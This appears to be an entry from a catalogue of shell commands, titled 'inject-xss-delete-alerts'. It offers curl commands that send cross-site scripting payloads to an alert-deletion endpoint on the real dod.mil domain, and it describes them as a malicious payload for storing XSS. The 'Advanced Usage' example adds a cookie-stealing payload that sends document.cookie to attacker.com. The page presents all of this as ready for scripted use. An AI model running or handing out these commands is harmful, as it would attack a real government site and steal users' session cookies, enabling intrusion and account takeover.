---
id: cmd-uuid-1
data: >-
  curl -X GET "https://www.dod.mil/alerts/delete/id/1234<img src=x
  onerror=alert('XSS')>" -v
tags:
  - xss
  - injection
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:12.572Z'
verified: false
validated: true
submitted: true
---
---

# inject-xss-delete-alerts

## Command

```bash
curl -X GET "https://www.dod.mil/alerts/delete/id/1234<img src=x onerror=alert('XSS')>" -v
```

## Description

This command sends a GET request to the DoD alerts deletion endpoint with a malicious ID payload to store XSS. Use for testing or automation from a script.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with encoded payload | Yes |
| -v | Verbose output for response details | No |

## Examples

### Basic Usage

```bash
curl "https://www.dod.mil/alerts/delete/id/test<payload>"
```

### Advanced Usage

```bash
curl -X GET "https://www.dod.mil/alerts/delete/id/1234<img src=x onerror=document.location='http://attacker.com/steal?cookie='+document.cookie>" -v --cookie "session=abc"
```

## Expected Output

HTTP response headers and body indicating successful request (e.g., 200 OK or redirect), with no explicit error for storage.

## Related

- [[Related Procedure]]
